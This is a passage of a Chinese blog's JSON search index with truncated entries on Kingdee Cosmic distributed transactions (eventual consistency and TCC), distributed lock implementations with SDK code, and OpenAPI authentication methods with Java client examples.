1.如果出现异常，有一些更新的数据要回滚，而不是让系统重试直到成功； 2.不能接受异步执行，所有逻辑必须同步完成，实时等待执行结果。 正常提交流程: 在第一次调用register注册最终一致服务的时候，会开启一个新的分布式事务，创建全局唯一的xid所有通过register注册的信息暂时不会执行，而是先记录到本地数据库的表中t_dtx_local_tx_log如果一切顺利，本地事务成功提交，会自动触发提交分布式事务到事务协调器事务协调器收到提交后，会根据register的调用顺序逐个执行最终一致服务，直到全部完成。如果本地事务回滚了，会怎么处理？ 回滚流程: 当本地事务事务被回滚时，由于register的信息没有真正执行，所以相当于什么都没做，数据是一致。同时，如果已经开启是分布式事务，则会通知协调器回滚。如果在执行过程中，任何一个环节出现问题，包括宕机、程序bug、网络异常、数据库访问超时等情况，KDTX是怎么保证数据最终还是一致的？可以阅读手动事务补偿部分。使用最终一致模式之前，需要在业务数据库中创建本地事务表。 2.3.2 TCC模式 TCC通过两阶段提交来保证分布式环境下的数据强一致: 第一阶段 : TRY锁定/预留资源; 第二阶段 :COMFIRM/CANCEL提交或回滚资源。 适用场景 : TCC最大的特点是提供“后悔”的能力。最终一致模式在数据不一致时会尝试重试，让流程接着往下走，直到最后都成功。假设有个分布式事务的场景，其中一个环节是扣减库存，当库存为0并且不允许负库存时抛出异常，这样即使重试100次也不可能成功，最合理的做法是把前面数据回滚到原来的状态。这种情况你需要TCC。所以TCC适合这些场景：涉及库存，金额等余额更新类的数据操作；数据一旦异常，必须要回滚，使用重试无法解决的场景。 工作原理 : TCC实现的是业务层面的两阶段提交: 第一阶段：TRY - 锁定/预留的资源，比如库存锁定或预占; 第二阶段：CONFIRM - 若TRY阶段的资源全部锁定成功，则调用所有的CONFIRM提交资源，如扣减库存生效;CANCEL - TRY阶段只要有任何异常，则调用已执行过TRY对应的CANCEL，回滚资源，比如预占库存回退。 TCC模式使用限制 : 1.只有TRY阶段异常才会回滚，一旦进入CONFIRM阶段，则不能再回滚，系统会重试直到最后成功； 2.相对最终一致模式，TCC对业务的入侵更大，这也是想保证数据强一致的代价； 3.TCC也是异步执行，有可能转人工补偿，无法实时反馈执行结果。 标准TCC: 标准TCC模式中，每个对数据的更新操作都需要分离到TCC服务中。下面这个图展示了标准的TCC模式，事务正常提交的流程: 第1步会在首次TRY的时候自动调用，像懒加载一样可以提交系统效率； 第3步需要显式的提交，因为标准TCC模式下跟本地事务是没有绑定的。 TCC try异常回滚: 插件中的TCC事务: 在标准的TCC模式中，有一点无法做到的是：集成在苍穹插件流程里的数据更新操作（比如单据审核）无法或者很难分离到TCC服务中，使用TCCGlobalSession类在插件中操作TCC可以解决这个问题。下面的图展示了在插件使用TCC的工作流程: 1.这里保障了3个数据更新的强一致性：审核，采购单，库存。而标准的TCC只能保障后面2个； 2.这种用法分布式事务和插件的本地事务会绑定在一起，所以第3步是自动提交的，不需要显式提交； 3.在业务库中也需要建一张TCC的本地事务表。 ","date":"2025-06-07","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/:2:3","tags":[],"title":"kd-分布式事务","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"},{"categories":["Java后端"],"content":"3. 开发步骤 金蝶云苍穹开发者门户 框架限制性很大，不详细展示，可查看官网 ","date":"2025-06-07","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/:3:0","tags":[],"title":"kd-分布式事务","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"},{"categories":["Java后端"],"content":"4. 底层解析 ","date":"2025-06-07","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/:4:0","tags":[],"title":"kd-分布式事务","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"},{"categories":["Java后端"],"content":"最终一致模式 如果要使用最终一致模式的分布式事务，则需要继承[EventualConsistencyService](https://dev.kingdee.com/sdk/Cosmic V7.0.1/javadoc/kd/bos/kdtx/sdk/api/EventualConsistencyService.html)这个抽象类。 public class AlphaECService extends EventualConsistencyService { /** * @param param 注册时的业务参数 * @param lastReturn 上一个服务的返回结果 */ @Override public DtxResponse execute(Object param, Object lastReturn) throws Exception { CommonParam commonParam = (CommonParam) param; String foobar = commonParam.getString(\"foobar\"); // 执行业务逻辑 return null; } } //1.业务的异常务必要抛出，否则协调器会认为逻辑执行成功，并完成事务提交； //2.业务执行的逻辑必须要实现幂等。 EventualConsistencyService 事务接口 package kd.bos.kdtx.sdk.api; import static kd.bos.kdtx.sdk.api.TCCAdapterService.Section.TRY; import java.util.ArrayList; import java.util.HashSet; import java.util.List; import java.util.Set; import kd.bos.context.KdtxRequestContext; import kd.bos.db.DB; import kd.bos.db.DBRoute; import kd.bos.db.tx.TX; import kd.bos.db.tx.TXHandle; import kd.bos.id.ID; import kd.bos.kdtx.common.config.DtxConfig; import kd.bos.kdtx.common.constant.GlobalTxStatus; import kd.bos.kdtx.common.exception.TCCTryException; import kd.bos.kdtx.common.invoke.DtxResponse; import kd.bos.kdtx.sdk.entity.DtxTCCLog; import kd.bos.kdtx.sdk.exception.tcc.TCCLoadDataException; import kd.bos.kdtx.sdk.exception.tcc.TCCLogInsertException; import kd.bos.kdtx.sdk.exception.tcc.TCCLogUpdateException; import kd.bos.kdtx.sdk.exception.tcc.TCCSaveDataException; import kd.bos.logging.Log; import kd.bos.logging.LogFactory; import kd.bos.util.StringUtils; import kd.sdk.annotation.SdkInternal; import kd.sdk.annotation.SdkPublic; /** * TCC服务适配器: * 1. 实现空回滚 * 2. 防止悬挂 * 3. 一定程度上解决幂等问题 * @author rd_xiaojia_xu */ @SdkPublic public abstract class TCCAdapterService implements TCCService { private static Log logger = LogFactory.getLog(TCCAdapterService.class); // try是java语言的保留字，这里使用首字母大写的Try /** * TCC模式try阶段:锁定资源 * @param param 参数 * @throws Exception 异常 */ public abstract void Try(Object param) throws Exception; /** * TCC模式confir阶段：提交","date":"2025-06-07","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/:4:1","tags":[],"title":"kd-分布式事务","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"},{"categories":["Java后端"],"content":"TCC模式 ","date":"2025-06-07","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/:4:2","tags":[],"title":"kd-分布式事务","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E4%BA%8B%E5%8A%A1/"},{"categories":["Java后端"],"content":"单体式锁 ","date":"2025-06-06","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/:1:0","tags":[],"title":"kd-分布式锁","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/"},{"categories":["Java后端"],"content":"synchronized 同步代码块 Object obj = new Object(); synchronized(obj){ //需要被同步的代码块 } synchronized(this){} //上面两种锁的都是对象 synchronize(TheClass.class){ } //这种锁住的是一个类 同步方法 public synchronized void testThread() { //需要被同步的代码块 } ","date":"2025-06-06","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/:1:1","tags":[],"title":"kd-分布式锁","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/"},{"categories":["Java后端"],"content":"同步锁 ReentrantLock JDK 1.7之后引入的JUC包中的重要工具类，让线程同步变得如此丝滑 class A { private final ReentrantLock lock=new ReentrantLock(); public void method() { lock.lock(); try{ //需要被同步的代码块 }catch(Exception e){ e.printStackTrace(); }finally{ lock.unlock(); } } } 上面两种都是单体锁，跨JVM的情况下不好使，如果需要解决分布式服务下的资源竞争问题，需要引入分布式锁。 ","date":"2025-06-06","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/:1:2","tags":[],"title":"kd-分布式锁","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/"},{"categories":["Java后端"],"content":"分布式锁 常见的分布式锁实现方式： 基于数据库的实现‌ ‌唯一索引/行锁方案‌：通过数据库表（如lock_table）的lock_key字段设置唯一约束，插入成功代表加锁，删除代表释放。‌‌‌SELECT FOR UPDATE方案‌：利用数据库行锁机制，事务中通过SELECT FOR UPDATE锁定数据行，事务结束自动释放锁。‌‌ ​ ‌2. 基于Redis的实现 ‌SETNX+EXPIRE方案‌：通过SETNX命令（key不存在时设置值）和EXPIRE设置超时时间，UUID标识锁所有者确保安全释放。‌‌‌Redisson框架方案‌：解决原生Redis方案的超时问题，通过看门狗机制自动续期锁，红锁（RedLock）算法应对主从切换场景。‌‌ ​ ‌3. 基于Zookeeper的实现‌ ‌临时顺序节点方案‌：在Zookeeper的lock节点下创建临时顺序子节点，判断是否为最小节点获取锁，并通过监听机制实现排队。‌‌‌‌ ","date":"2025-06-06","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/:2:0","tags":[],"title":"kd-分布式锁","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/"},{"categories":["Java后端"],"content":"某系统分布式锁实现方案： import kd.bos.dlock.DLock; //创建锁 DLock lock = DLock.create(\"key\", \"desc\"); // 获取锁 boolean islock = lock.tryLock(1000L); if(islock){ try{ //here I can do something only I can do... } finally{ // 释放锁 lock.unlock(); } }else{ // 获取锁失败 } ","date":"2025-06-06","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/:3:0","tags":[],"title":"kd-分布式锁","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/"},{"categories":["Java后端"],"content":"通过工厂方法配置不同的分布式锁实现方案： DLockConfig 分布式锁配置类 package kd.bos.dlock.config; import kd.bos.dlock.DLockType; import kd.bos.util.ConfigurationUtil; public class DLockConfig { public static final String DLOCK_STORE_ZOOKEEPER = \"DLock.zookeeper\"; public static final String DLOCK_STORE_ZOOKEEPERS = \"DLock.zookeepers\"; public static final String DLOCK_PERFORMANCE = \"DLock.performance\"; private static final String DLOCK_TYPE = \"DLock.type\"; private static DLockType dlockType; public static final String REDIS_CACHE_URL_KEY = \"redis.serversForCache\"; public static final String REDIS_DLOCK_URL_KEY = \"DLock.redis\"; public static final String REDIS_DLOCK_URLS_KEY = \"DLock.redises\"; private static final String DLOCK_VERSION2 = \"DLock.version2\"; private static final String DLOCK_CLEAN_ENABLE = \"DLock.clean.enable\"; private static final String DLOCK_CLEAN_CRON = \"DLock.clean.cron\"; private static final String DLOCK_USE_REDIS_ACQUIRED = \"DLock.useRedisAcquired\"; private static final String DLOCK_EXPIRE_TIMEOUT = \"DLock.expireTimeout\"; private static final String DLOCK_ACQUIRED_TIMEOUT = \"DLock.acquiredTimeoutMillis\"; private static final String DLOCK_LOCK_MAXIMUM = \"DLock.lockMaximum\"; private static final String DLOCK_LOCK_MAXIMUM_ENABLE = \"DLock.lockMaximum.enable\"; private static final String DLOCK_DESC_WITH_THREAD = \"dlock.monitor.descWithThread\"; private static final String DLOCK_ACQUIRE_RETRY_TIMES = \"DLock.acquireRetryTimes\"; private static boolean dLockVersion2; private static boolean dLockCleanEnable; private static String dLockCleanCron; private static boolean useRedisAcquired; private static int expireTimeout; private static long acquiredTimeoutMillis; private static boolean lockMaxLimitEnable; private static int lockMaximum; private static boolean descWithThread; private static int acquireRetryTimes; public DLockConfig() { } public static DLockType getDLockType() { return dlockType; } public static boolean isdLockVersion2() { return dLockVersion2; } public static boolean dLock","date":"2025-06-06","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/:3:1","tags":[],"title":"kd-分布式锁","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/"},{"categories":["Java后端"],"content":"方案一：zookeeper 默认方案 CuratorLockManager zookpeer分布式锁管理实现主入口 ​ 分布式锁管理器类，实现了 DLockManager 接口，并提供了创建、获取、释放和强制解锁等分布式锁相关功能。 核心作用 实现分布式锁管理 通过封装 Apache Curator 提供的分布式协调能力（如临时节点、顺序节点等），提供统一的分布式锁接口。 支持两种模式： performance: 使用性能优先的锁机制（对应 InterProcessMutexPerformance）。 stability: 使用稳定性优先的锁机制（对应 InterProcessMutexStability）。 支持可重入锁 利用 ThreadLocal\u003cMap\u003cString, ReentrantDLock» thReentrantDLock 实现线程级别的锁重入。 每个锁路径对应一个 ReentrantDLock，记录引用次数，避免重复加锁导致死锁。 自动清理无效锁 在 unlock() 和 tryClear() 方法中尝试删除无子节点的锁路径（包括 /locks、/leases 等），防止锁残留。 结合 ZooKeeper 的事务操作保证原子性。 支持锁信息查询与审计 提供 getAllLockInfo() 和 getLockInfo() 方法获取当前所有锁的状态信息（如持有者、等待数、创建时间等）。 集成日志、追踪（Tracer）、审计（Audit）模块，便于调试和监控锁使用情况。 异常处理与自动恢复 对于可能抛出的异常（如 ZooKeeper 连接中断、节点不存在等），进行捕获并包装为统一的 KDException。 在 validateLockCount() 中检测锁数量异常时会尝试重置锁计数，提升健壮性。 支持强制解锁与清除锁 提供 forceUnlock() 和 forceClear() 方法，用于管理员或运维工具手动干预锁状态，解决死锁或遗留锁问题。 可选地通过 Redis 缓存记录锁信息以加速判断和清理。 性能优化与并发控制 使用 ConcurrentHashMap 存储锁计数，避免多线程竞争。 使用 synchronized 控制锁计数的增减，确保线程安全。 通过 ThreadLocal 减少锁对象的创建开销。 package kd.bos.dlock.curator; import java.util.Comparator; import java.util.HashMap; import java.util.List; import java.util.Map; import java.util.Set; import java.util.TreeSet; import java.util.concurrent.ConcurrentHashMap; import java.util.concurrent.TimeUnit; import java.util.concurrent.atomic.AtomicInteger; import java.util.stream.Collectors; import kd.bos.audit.Audit; import kd.bos.audit.Auditable; import kd.bos.bundle.Resources; import kd.bos.dlock.AbstractDLock; import kd.bos.dlock.DLock; import kd.bos.dlock.DLockInfo; import kd.bos.dlock.DLockManager; import kd.bos.dlock.DLockMode; import kd.bos.dlock.DLockUtil; import kd.bos.dlock.config.DLockConfig; import kd.bos.exception.BosErrorCode; import kd.bos.exception.KDException; import kd.bos.exception.KDExceptionKit; import kd.bos.instance.Instance; import kd.bos.redis.JedisClient; import kd.bos.redis.RedisFactory; import kd.bos.trace.TraceSpan; import kd.bos.trace.Tracer; import kd.bos.trace.tracer.MemSpanTrace; import kd.bos.util.DisCardUtil; imp","date":"2025-06-06","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/:3:2","tags":[],"title":"kd-分布式锁","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/"},{"categories":["Java后端"],"content":"方案二：Redis RedisLockManager redis分布式锁管理实现入口 一个用于统一创建和管理 RedisLocker 实例的 分布式锁管理器，它实现了 DLockManager 接口。该类在分布式系统中承担着“工厂 + 管理者”的角色，主要负责为不同业务场景提供可重入或非可重入的 Redis 分布式锁，并对这些锁进行统一的生命周期管理和资源协调 核心作用： 核心字段 核心方法： 内部类：ReentrantDLock 这是一个封装了引用计数的可重入锁包装类： incRef() / decRef()：增加/减少引用计数。 canRelease()：判断是否可以释放锁。 release()：从线程本地缓存中移除锁。 与RedisLocker的区别 package kd.bos.dlock.redis; import java.util.HashMap; import java.util.List; import java.util.Map; import java.util.concurrent.ConcurrentHashMap; import kd.bos.bundle.Resources; import kd.bos.dlock.DLock; import kd.bos.dlock.DLockInfo; import kd.bos.dlock.DLockManager; import kd.bos.dlock.DLockUtil; import kd.bos.encrypt.Encrypters; import kd.bos.exception.BosErrorCode; import kd.bos.exception.KDException; import kd.bos.redis.JedisClient; import kd.bos.redis.RedisTracker; import kd.bos.redis.pool.Pool0; import kd.bos.redis.pool.Pool0BuilderImpl; import kd.bos.redis.wrapper.Wrapper; public class RedisLockManager implements DLockManager { private static final ThreadLocal\u003cMap\u003cString, ReentrantDLock\u003e\u003e thReentrantDLock = ThreadLocal.withInitial(() -\u003e new HashMap\u003c\u003e()); private static ConcurrentHashMap\u003cString, Pool0\u003c?\u003e\u003e poolMap = new ConcurrentHashMap\u003c\u003e(); private final String rootPath; private final RedisClientSplit redisClients; static JedisClient getOrCreate(String url) { Pool0\u003c?\u003e pool = poolMap.computeIfAbsent(url, key -\u003e { try { return Pool0BuilderImpl.getPool(Encrypters.decode(key)); } catch (Exception e) { throw new KDException(e, BosErrorCode.bOS, new Object[] { Resources.getString(\"bos-dlock\", \"RedisLockManager_0\", new Object[0]) }); } }); try { Object resource = pool.getResource(); return (JedisClient)RedisTracker.track(Wrapper.wrap(resource)); } catch (Exception e) { String msg = \"Get JedisClient error: \" + e.getMessage() + \",trackMessage:\" + RedisTracker.getTrackMessage(); throw new KDException(e, BosErrorCode.bOS, new Object[] { msg }); } } static JedisClient getOrCreateForKeeper(String url) { return getOrCreate(url); } static class ","date":"2025-06-06","objectID":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/:3:3","tags":[],"title":"kd-分布式锁","uri":"/posts/kd-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81/"},{"categories":["Java后端"],"content":"OpenAPI共支持五种认证方式，分别是： AccessToken 认证 JWT认证 摘要认证 基本认证 签名认证 其中，AccessToken认证应用最广泛，基本认证则最方便。从安全和易用性的角度进行分析，不同的认证方式各有特点，用户可以根据具体需求，选择合适的认证方式。 特点 强弱分析 安全性 签名认证 \u003e 摘要认证 \u003e JWT \u003e AccessToken认证 \u003e 基本认证 便捷性 基本认证 \u003eJWT \u003e AccessToken认证 \u003e 摘要认证 \u003e 签名认证 ","date":"2025-06-05","objectID":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/:0:0","tags":[],"title":"kd-OpenAPI-API请求的身份鉴权","uri":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/"},{"categories":["Java后端"],"content":"AccessToken 认证/JWT认证 Access Token 是在身份验证和授权过程中用于确保安全性的一种机制。它使得应用能够安全地代表用户访问资源，同时避免泄露用户的敏感信息。它通常有一个有效期，过期后需要通过 Refresh Token 或重新授权来更新。 Access Token（访问令牌） 是一种用来验证用户身份和授权应用访问特定资源的凭证。在现代的身份验证和授权体系中，特别是基于 OAuth 2.0 和 OpenID Connect 协议的系统中，access token 扮演着非常重要的角色。它通常由身份验证服务（例如，OAuth 2.0 授权服务器）发放，并被应用程序用来访问受保护的 API 或资源。 ","date":"2025-06-05","objectID":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/:1:0","tags":[],"title":"kd-OpenAPI-API请求的身份鉴权","uri":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/"},{"categories":["Java后端"],"content":"认证流程 客户端通过认证服务器请求认证； 认证服务器检验客户端认证是否有效，如果有效，返回一个 Access Token 和一个 Refresh Token； 客户端通过 Access Token 去请求服务器的资源； 如果 Access Token 有效，服务器返回给客户端资源，如果 Access Token 失效，服务器返回给客户端 Token 失效的信息，然后客户端会通过 Refresh Token 再次请求获取新的 Access Token； ","date":"2025-06-05","objectID":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/:1:1","tags":[],"title":"kd-OpenAPI-API请求的身份鉴权","uri":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/"},{"categories":["Java后端"],"content":"Access Token 是什么？ Access Token 通常包含以下信息： 用户信息：如用户的 ID、权限、角色等。 有效期：access token 通常有一个有效期，过期后需要重新获取。 授权范围：即该令牌可以访问的资源范围，例如特定的 API 路径或服务。 签名：为了防止篡改，access token 会被加密或使用签名确保其完整性和真实性。 ","date":"2025-06-05","objectID":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/:1:2","tags":[],"title":"kd-OpenAPI-API请求的身份鉴权","uri":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/"},{"categories":["Java后端"],"content":"为什么需要 Access Token？ Access Token 的核心作用是验证用户身份并授权访问资源。它解决了以下几个问题： 安全性：access token 可以防止用户名和密码泄露。使用 token 替代密码传输，有效防止暴露用户的敏感信息。 跨系统授权：在分布式系统或第三方应用中，token 可以用于跨服务、跨平台的身份验证与授权，避免了每次都需要重新登录。 短期有效：与长期的凭证（如用户名、密码）不同，access token 是短期有效的，这降低了被滥用的风险。 ","date":"2025-06-05","objectID":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/:1:3","tags":[],"title":"kd-OpenAPI-API请求的身份鉴权","uri":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/"},{"categories":["Java后端"],"content":"Access Token 的格式 Access Token 的格式可以有多种，常见的格式包括： JWT（JSON Web Token）：JWT 是一种基于 JSON 的轻量级的身份验证令牌，通常由三部分组成：头部（header）、负载（payload）、签名（signature）。JWT 是目前最常用的 Access Token 格式。 Opaque Token（不透明令牌）：不像 JWT 可以直接查看和解析，Opaque Token 是一串随机的字符串，不能直接查看其中的内容，需要通过授权服务器来验证。 ","date":"2025-06-05","objectID":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/:1:4","tags":[],"title":"kd-OpenAPI-API请求的身份鉴权","uri":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/"},{"categories":["Java后端"],"content":"Access Token 的安全性 Access Token 需要妥善保护，避免泄露。泄露的 Access Token 可以被恶意用户用来冒充合法用户进行非法操作。为了增强安全性，常见的做法包括： 使用 HTTPS：确保所有的 Access Token 都通过 HTTPS 传输，防止中间人攻击。 使用短生命周期 Token：Access Token 设置较短的有效期，减小令牌泄露后的风险。 使用 Refresh Token 刷新：使用 Refresh Token 更新 Access Token，避免长期暴露 Access Token。 ","date":"2025-06-05","objectID":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/:1:5","tags":[],"title":"kd-OpenAPI-API请求的身份鉴权","uri":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/"},{"categories":["Java后端"],"content":"摘要认证 摘要认证使用摘要代替token的传输，并采用MD5、SHA等不可逆哈希算法对参数摘要。首先，客户端通过指定的加密算法将随机数、时间戳等信息生成摘要。然后，调用请求时，将摘要放在请求头中发送给服务器；最后，服务器拿到摘要后，使用同样的算法和数据库密钥进行摘要并对比，匹配则身份验证通过。 ","date":"2025-06-05","objectID":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/:2:0","tags":[],"title":"kd-OpenAPI-API请求的身份鉴权","uri":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/"},{"categories":["Java后端"],"content":"认证流程 （1）客户端发送一个未经认证的请求到服务器。 （2）服务器返回一个HTTP 401 Unauthorized响应，其中包含一个WWW-Authenticate头部字段。 （3）客户端收到401响应后，会根据服务器提供的信息，计算出一个摘要（digest）。客户端将摘要信息添加到请求头中，并重新发送认证请求。 （4）服务器收到带有摘要的请求后，会使用相同的算法计算出摘要，并与客户端发送的摘要进行比较，如果一致，则服务器会接受该请求并返回请求的资源，否则，服务器拒绝请求并返回401。 ","date":"2025-06-05","objectID":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/:2:1","tags":[],"title":"kd-OpenAPI-API请求的身份鉴权","uri":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/"},{"categories":["Java后端"],"content":"简单示例 常用参数 username，用户。 password，密码。 realm，域，用来指示需要哪个域的用户名和密码。 nonce，服务端产生的随机数，唯一的、不重复的。 nc，认证的次数。 cnonce，客户端产生的随机数，唯一的、不重复的。 qop，包含auth和auth-int两种策略。 opaque，服务器端产生的字符串，透传而已。 response，服务器根据相关信息计算摘要，并与客户端传过来的response值对比，如果一样，则认证通过，否则通不过。 HttpClient 代码示例 模拟客户端两次请求 /** * 摘要认证 两次请求 * * @param url * @return 返回结果 */ public static Boolean doPostDigest(String url, String username, String password) { log.info(\"Post请求url:[{}]\", url); CloseableHttpClient httpClient = null; CloseableHttpResponse response = null; HttpPost httpPost = null; String strResponse = null; Boolean flag = false; try { httpClient = HttpClients.createDefault(); httpPost = new HttpPost(url); // 构造请求头 httpPost.setHeader(\"Content-type\", \"application/json; charset=utf-8\"); httpPost.addHeader(\"Cache-Control\", \"no-cache\"); //设置缓存 httpPost.setHeader(\"Connection\", \"Close\"); RequestConfig.Builder builder = RequestConfig.custom(); builder.setSocketTimeout(3000); //设置请求时间 builder.setConnectTimeout(5000); //设置超时时间 builder.setRedirectsEnabled(false);//设置是否跳转链接(反向代理) // 设置 连接 属性 httpPost.setConfig(builder.build()); // 执行请求 response = httpClient.execute(httpPost); HttpEntity responseEntity = response.getEntity(); // 检验返回码 int statusCode = response.getStatusLine().getStatusCode(); log.info(\"第一次发送摘要认证 Post请求 返回码:{}\", statusCode); if (401 == statusCode) { strResponse = EntityUtils.toString(responseEntity, \"utf-8\"); log.info(\"Post请求401返回结果:{}\", strResponse); // 组织参数，发起第二次请求 Header[] headers = response.getHeaders(\"WWW-Authenticate\"); HeaderElement[] elements = headers[0].getElements(); String realm = null; String qop = null; String nonce = null; String opaque = null; String method = \"POST\"; String uri = \"/VIID/System/Register\"; for (HeaderElement element : elements) { if (element.getName().equals(\"Digest realm\")) { realm = element.getValue(); } else if (element.getName().equals(\"qop\")) { qop = element.getValue(); } else if (element.getName().equals(\"nonce\")) { nonce = element.getValue(); } else if (element.getName().equals(\"op","date":"2025-06-05","objectID":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/:2:2","tags":[],"title":"kd-OpenAPI-API请求的身份鉴权","uri":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/"},{"categories":["Java后端"],"content":"基本认证 Basic认证是最常见的HTTP认证方式之一。在Basic认证中，客户端发送请求时，会在请求头中包含一个\"Authorization\"字段，该字段包含了经过Base64编码的用户名和密码。服务器收到请求后，会解码该字段并验证用户名和密码是否正确。 例如，用户名是 admin，密码是 password，将这两者拼接为 admin:password，然后用 Base64 编码后变成 YWRtaW46cGFzc3dvcmQ=，该字符串会被添加到请求头中的 Authorization 字段，格式如下： Authorization: Basic YWRtaW46cGFzc3dvcmQ= HttpURLConnection类进行HTTPS基本认证的示例代码 import java.io.BufferedReader; import java.io.InputStreamReader; import java.net.HttpURLConnection; import java.net.URL; import java.nio.charset.StandardCharsets; import java.util.Base64; public class HttpsBasicAuthExample { public static void main(String[] args) throws Exception { // 设置请求的URL URL url = new URL(\" // 创建HttpURLConnection对象 HttpURLConnection connection = (HttpURLConnection) url.openConnection(); // 设置请求方法为GET connection.setRequestMethod(\"GET\"); // 添加Authorization字段 String username = \"your_username\"; String password = \"your_password\"; String credentials = username + \":\" + password; String encodedCredentials = Base64.getEncoder().encodeToString(credentials.getBytes(StandardCharsets.UTF_8)); connection.setRequestProperty(\"Authorization\", \"Basic \" + encodedCredentials); // 发送请求并获取响应 int responseCode = connection.getResponseCode(); BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream())); String line; StringBuilder response = new StringBuilder(); while ((line = reader.readLine()) != null) { response.append(line); } reader.close(); // 打印响应内容 System.out.println(\"Response Code: \" + responseCode); System.out.println(\"Response Body: \" + response.toString()); } } ","date":"2025-06-05","objectID":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/:3:0","tags":[],"title":"kd-OpenAPI-API请求的身份鉴权","uri":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/"},{"categories":["Java后端"],"content":"签名认证 ","date":"2025-06-05","objectID":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/:4:0","tags":[],"title":"kd-OpenAPI-API请求的身份鉴权","uri":"/posts/kd-openapi-api%E8%AF%B7%E6%B1%82%E7%9A%84%E8%BA%AB%E4%BB%BD%E9%89%B4%E6%9D%83/"},{"categories":["Java后端"],"content":"认证流程 